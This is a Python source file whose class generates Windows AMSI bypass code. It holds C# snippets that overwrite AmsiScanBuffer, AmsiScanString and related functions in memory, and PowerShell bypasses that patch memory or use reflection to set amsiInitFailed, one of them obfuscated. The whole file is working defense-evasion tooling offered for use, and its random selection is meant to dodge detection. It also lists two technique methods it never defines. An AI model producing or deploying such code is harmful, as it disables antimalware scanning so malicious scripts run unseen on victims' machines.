import random
import base64
import hashlib

class AMSIBypass:
    def __init__(self):
        self.techniques = [
            self._patch_amsi_buffer,
            self._force_error,
            self._memory_patch,
            self._etw_patch_combo,
            self._clr_hooking,
        ]
    
    def generate_bypass(self, technique="random") -> str:
        """Generate AMSI bypass code"""
        if technique == "random":
            technique_func = random.choice(self.techniques)
        else:
            tech_map = {t.__name__: t for t in self.techniques}
            technique_func = tech_map.get(technique, self._patch_amsi_buffer)
        
        return technique_func()
    
    def _patch_amsi_buffer(self) -> str:
        """Patch AMSI buffer to always return clean"""
        return """
// AMSI Buffer Patching Technique
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string lpLibName);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
                                        uint flNewProtect, out uint lpflOldProtect);

var lib = LoadLibrary("amsi.dll");
var addr = GetProcAddress(lib, "AmsiScanBuffer");
VirtualProtect(addr, (UIntPtr)5, 0x40, out uint oldProtect);
byte[] patch = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; // MOV EAX, 0x80070057; RET
Marshal.Copy(patch, 0, addr, 6);
VirtualProtect(addr, (UIntPtr)5, oldProtect, out oldProtect);
"""
    
    def _force_error(self) -> str:
        """Force AMSI to error out"""
        return """
// AMSI Force Error Technique
public class AmsiUtils {
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, 
                                            uint flNewProtect, out uint lpflOldProtect);
}

IntPtr amsiHandle = AmsiUtils.GetModuleHandle("amsi.dll");
IntPtr scanPtr = AmsiUtils.GetProcAddress(amsiHandle, "AmsiScanString");
uint oldProtect;
AmsiUtils.VirtualProtect(scanPtr, 0x60, 0x40, out oldProtect);
byte[] errorPatch = { 0xC3 }; // Just RET immediately
Marshal.Copy(errorPatch, 0, scanPtr, 1);
AmsiUtils.VirtualProtect(scanPtr, 0x60, oldProtect, out oldProtect);
"""
    
    def _memory_patch(self) -> str:
        """Memory patch AMSI functions"""
        return """
// Memory Patch Multiple AMSI Functions
string[] amsiFunctions = {
    "AmsiScanBuffer", "AmsiScanString", 
    "AmsiInitialize", "AmsiOpenSession"
};

foreach(var func in amsiFunctions) {
    try {
        var ptr = GetProcAddress(GetModuleHandle("amsi.dll"), func);
        if(ptr != IntPtr.Zero) {
            VirtualProtect(ptr, (UIntPtr)8, 0x40, out uint old);
            Marshal.Copy(new byte[] {0xC3}, 0, ptr, 1); // RET
            VirtualProtect(ptr, (UIntPtr)8, old, out old);
        }
    } catch {}
}
"""
    
    def generate_ps_bypass(self) -> str:
        """Generate PowerShell AMSI bypass"""
        techniques = [
            # Technique 1: Memory patch
            """
$MethodDefinition = @'
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
                                        uint flNewProtect, out uint lpflOldProtect);
'@
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
$amsiDll = $Kernel32::GetModuleHandle('amsi.dll')
$asb = $Kernel32::GetProcAddress($amsiDll, 'AmsiScanBuffer')
$oldProtection = 0
$Kernel32::VirtualProtect($asb, [uint32]5, 0x40, [ref]$oldProtection)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $asb, 6)
$Kernel32::VirtualProtect($asb, [uint32]5, $oldProtection, [ref]$oldProtection)
""",
            # Technique 2: Reflection bypass
            """
$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
""",
            # Technique 3: Forced error
            """
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType(
'System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType(
'System.Reflection.BindingFlags')), [Object]([Ref].Assembly.GetType(
'System.Management.Automation.AmsiUtils')), 'GetField').Invoke('amsiInitFailed', 
(36 -bor 4)).SetValue($null, $true)
"""
        ]
        
        # Return 2 random techniques for redundancy
        selected = random.sample(techniques, 2)
        return "\n".join(selected)
